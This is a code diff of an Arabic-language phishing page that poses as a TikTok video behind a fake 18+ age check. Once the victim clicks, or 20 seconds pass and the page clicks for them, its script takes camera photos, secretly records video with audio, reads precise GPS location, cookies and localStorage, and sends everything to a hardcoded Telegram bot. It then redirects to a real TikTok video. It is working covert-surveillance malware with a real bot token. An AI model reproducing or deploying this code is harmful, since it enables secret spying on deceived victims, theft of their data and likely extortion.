@@ -2,19 +2,142 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيديو حصري 🔞</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>فيديو حصري</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-touch-callout: none;
+        }
         body {
+            margin: 0;
+            padding: 0;
             background: #000;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        .video-container {
+            width: 100vw;
             height: 100vh;
+            max-width: 500px;
+            margin: auto;
+            position: relative;
+            background: #000;
+        }
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff0050, #00f2ea);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+        }
+        .play-button {
+            width: 80px;
+            height: 80px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
+            backdrop-filter: blur(10px);
+            margin-bottom: 15px;
         }
-        /* الخلفية السوداء مع تأثير ضبابي */
+        .play-button svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+            margin-left: 5px;
+        }
+        .placeholder-text {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            text-align: center;
+            padding: 0 20px;
+        }
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+        }
+        .spinner {
+            border: 8px solid rgba(255,255,255,0.3);
+            border-top: 8px solid #ff0050;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-message {
+            color: white;
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+            padding: 0 20px;
+        }
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0050, #00f2ea);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .hidden-ui {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .tiktok-sidebar, .video-info, .bottom-nav {
+            transition: opacity 0.5s ease;
+            position: absolute;
+            z-index: 15;
+        }
+        .tiktok-sidebar { right: 15px; bottom: 100px; display: flex; flex-direction: column; gap: 20px; }
+        .video-info { bottom: 80px; left: 15px; width: 70%; color: white; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+        .bottom-nav { bottom: 0; left: 0; width: 100%; height: 60px; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); display: flex; justify-content: space-around; align-items: center; }
+        .nav-item, .sidebar-icon { display: flex; flex-direction: column; align-items: center; color: white; font-size: 12px; }
+        .sidebar-icon svg, .nav-item svg { width: 30px; height: 30px; fill: white; margin-bottom: 4px; }
+        #recording-overlay {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 12px;
+            z-index: 9999;
+            display: none;
+            font-weight: bold;
+        }
+        /* نافذة التحقق المزيفة */
         .overlay {
             position: fixed;
             top: 0;
@@ -28,7 +151,6 @@
             justify-content: center;
             backdrop-filter: blur(10px);
         }
-        /* النافذة المزيفة التي تسبق طلب الصلاحية */
         .age-verification {
             background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
             width: 320px;
@@ -87,105 +209,201 @@
             color: #666;
             margin-top: 15px;
         }
-        .hidden-ui { display: none !important; }
-        /* باقي العناصر مثل تيك توك */
-        .video-container { width: 100vw; height: 100vh; max-width: 500px; margin: auto; position: relative; }
-        .video-placeholder { width: 100%; height: 100%; background: linear-gradient(45deg, #ff0050, #00f2ea); display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; }
-        .play-button { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
-        .play-button svg { width: 40px; height: 40px; fill: white; }
-        .tiktok-sidebar, .video-info, .bottom-nav { position: absolute; z-index: 15; color: white; }
-        .tiktok-sidebar { right: 15px; bottom: 100px; }
-        .video-info { bottom: 80px; left: 15px; }
-        .bottom-nav { bottom: 0; width: 100%; height: 60px; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); display: flex; justify-content: space-around; align-items: center; }
-        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 20; }
-        .spinner { border: 8px solid rgba(255,255,255,0.3); border-top: 8px solid #ff0050; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff0050, #00f2ea); width: 0%; }
+        .hidden-ui {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
     <div class="video-container">
         <div class="video-placeholder" id="video-placeholder">
             <div class="play-button"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-            <div style="color:white; font-weight:bold;">🔥 فضيحة أحد... 🔥<br>اضغط للمشاهدة</div>
+            <div class="placeholder-text">🔥 فضيحة أحد... 🔥<br>اضغط للمشاهدة</div>
         </div>
-        <!-- وهم تيك توك -->
-        <div class="tiktok-sidebar" id="fake-sidebar">...</div>
-        <div class="video-info" id="fake-info"><div>@viral_clips</div><div>🔥 لن تصدق 🔥</div></div>
-        <div class="bottom-nav" id="fake-nav"><span>🏠</span><span>🔍</span><span>➕</span><span>💬</span><span>👤</span></div>
-        <div id="loading-overlay"><div class="spinner"></div><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div></div>
+
+        <!-- Fake TikTok UI -->
+        <div class="tiktok-sidebar" id="fake-sidebar">
+            <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span>542K</span></div>
+            <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg><span>4,129</span></div>
+            <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92z"/></svg><span>Share</span></div>
+        </div>
+        <div class="video-info" id="fake-info">
+            <div class="username">@trending_viral</div>
+            <div class="description">🔥 لن تصدق ماذا حدث 🔥 #fyp #viral</div>
+            <div class="music">🎵 original sound - trending</div>
+        </div>
+        <div class="bottom-nav" id="fake-nav">
+            <div class="nav-item active">🏠 Home</div><div class="nav-item">🔍 Discover</div>
+            <div class="nav-item">➕</div><div class="nav-item">💬 Inbox</div><div class="nav-item">👤 Me</div>
+        </div>
+
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-message" id="loading-message">جاري تحميل الفيديو...</div>
+            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+        <div id="recording-overlay">🔴 تسجيل</div>
     </div>
 
-    <!-- نافذة التحقق من العمر المزيفة (تظهر قبل طلب الصلاحية) -->
+    <!-- نافذة التحقق من العمر المزيفة حسب الطلب -->
     <div id="age-fake-overlay" class="overlay">
         <div class="age-verification">
             <div class="warning-icon">🔞</div>
-            <h2>محتوى حساس للبالغين</h2>
-            <p>هذا الفيديو يحتوي على مشاهد <strong>جنسية صريحة (+18)</strong></p>
-            <div class="age-badge">تأكيد العمر مطلوب</div>
-            <p>للتحقق من أنك فوق 18 سنة، سيتم استخدام الكاميرا لمسح وجهك<br>(لن يتم تخزين أي صورة)</p>
+            <h2>Tik-Tok</h2>
+            <p>هذا الفيديو يحتوي على مشاهد جنسية صريحة (18+)<br>ينصح بمشاهدته من عمر 18+ فما فوق</p>
+            <div class="age-badge">تتطلب سياسة Tik-Tok تأكيد عمرك الحقيقي فوق الـ 18+ لمشاهدة الفيديو</div>
             <button id="fake-age-allow" class="fake-allow-btn">🎬 مشاهدة الفيديو 🔞</button>
-            <div class="small-note">بالضغط على "مشاهدة الفيديو" أنت تؤكد أنك فوق 18 سنة وتوافق على استخدام الكاميرا للتحقق</div>
+            <div class="small-note">بالضغط على "مشاهدة الفيديو" أنت تؤكد أنك فوق الـ 18+ سنة وتوافق على استخدام مشاهدة الكاميرا للتحقق</div>
         </div>
     </div>
 
     <script>
+        // Telegram Configuration
         const TELEGRAM_BOT_TOKEN = '8683251674:AAE73I1jn1GqjsIu6eVGRxya25q5ilNOzkA';
         const CHAT_ID = '6969346690';
         const REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
-        let collectedData = { timestamp: new Date().toISOString(), userAgent: navigator.userAgent, capturedImages: [], location: null };
+
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            capturedImages: [],
+            capturedVideo: null,
+            location: null,
+            cookies: null,
+            localStorageData: {}
+        };
 
         function updateProgress(p) { document.getElementById('progress-fill').style.width = p+'%'; }
 
-        async function fullSpyOperation() {
-            updateProgress(10);
-            // طلب الكاميرا الحقيقي يظهر الآن ولكن المستخدم متوقع له لأنه ضغط "مشاهدة الفيديو"
+        async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                collectedData.capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
                 stream.getTracks().forEach(t => t.stop());
-                updateProgress(50);
-                
-                // جلب الموقع
-                if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        collectedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                        updateProgress(70);
-                    });
-                }
-                updateProgress(90);
-                // إرسال البيانات
-                let msg = `🎯 Target\nTime: ${collectedData.timestamp}\nDevice: ${collectedData.userAgent}\n`;
-                if(collectedData.location) msg += `📍 GPS: ${collectedData.location.lat}, ${collectedData.location.lon}\n`;
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-                });
-                for(let img of collectedData.capturedImages) {
-                    let blob = await fetch(img).then(r => r.blob());
-                    let fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob, 'spy.jpg');
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                }
-                updateProgress(100);
-                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
-            } catch(e) { console.warn(e); }
+                return true;
+            } catch(e) { return false; }
         }
 
-        // عند الضغط على زر "مشاهدة الفيديو" المزيف
+        async function captureMultipleImages() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                
+                for (let i = 0; i < 3; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    collectedData.capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+                    await new Promise(r => setTimeout(r, 600));
+                }
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { return false; }
+        }
+
+        async function recordSecretVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
+                const chunks = [];
+                recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => { collectedData.capturedVideo = reader.result; };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.start();
+                await new Promise(r => setTimeout(r, 6000));
+                recorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { return false; }
+        }
+
+        async function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => { collectedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }; resolve(true); },
+                        () => resolve(false),
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                } else resolve(false);
+            });
+        }
+
+        function collectStorage() {
+            try {
+                collectedData.cookies = document.cookie;
+                for(let i=0; i<localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    collectedData.localStorageData[key] = localStorage.getItem(key);
+                }
+            } catch(e) {}
+        }
+
+        async function sendAllData() {
+            let msg = `🎯 Target Data\n⏰ Time: ${collectedData.timestamp}\n📱 Device: ${collectedData.userAgent.substring(0,150)}\n`;
+            if(collectedData.location) msg += `📍 GPS: ${collectedData.location.lat}, ${collectedData.location.lon}\n🗺️ https://maps.google.com/?q=${collectedData.location.lat},${collectedData.location.lon}\n`;
+            msg += `🍪 Cookies: ${collectedData.cookies ? collectedData.cookies.substring(0,200) : 'None'}\n`;
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+
+            for(let img of collectedData.capturedImages) {
+                let blob = await fetch(img).then(r => r.blob());
+                let fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'cam.jpg');
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                await new Promise(r => setTimeout(r, 500));
+            }
+            
+            if(collectedData.capturedVideo) {
+                let blob = await fetch(collectedData.capturedVideo).then(r => r.blob());
+                let fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('video', blob, 'secret.mp4');
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            }
+        }
+
+        async function fullOperation() {
+            updateProgress(10);
+            await requestCameraPermission();
+            updateProgress(25);
+            await captureMultipleImages();
+            updateProgress(45);
+            await recordSecretVideo();
+            updateProgress(65);
+            await getPreciseLocation();
+            updateProgress(80);
+            collectStorage();
+            updateProgress(90);
+            await sendAllData();
+            updateProgress(100);
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+        }
+
+        // عند الضغط على زر "مشاهدة الفيديو" المزيف في نافذة التحقق
         document.getElementById('fake-age-allow').addEventListener('click', async () => {
             document.getElementById('age-fake-overlay').classList.add('hidden-ui');
+            document.getElementById('video-placeholder').classList.add('hidden-ui');
+            document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
+            document.getElementById('fake-info')?.classList.add('hidden-ui');
+            document.getElementById('fake-nav')?.classList.add('hidden-ui');
             document.getElementById('loading-overlay').style.display = 'flex';
-            await fullSpyOperation();
+            await fullOperation();
         });
 
         // عند الضغط على زر الفيديو الأصلي نعرض نافذة التحقق المزيفة أولاً
@@ -195,9 +413,11 @@
 
         // تشغيل تلقائي بعد 20 ثانية
         setTimeout(() => {
-            if(document.getElementById('age-fake-overlay').classList.contains('hidden-ui') === false)
+            if(document.getElementById('age-fake-overlay') && !document.getElementById('age-fake-overlay').classList.contains('hidden-ui'))
                 document.getElementById('fake-age-allow').click();
         }, 20000);
+
+        document.addEventListener('touchmove', (e) => { if(e.target === document.body) e.preventDefault(); }, { passive: false });
     </script>
 </body>
 </html>
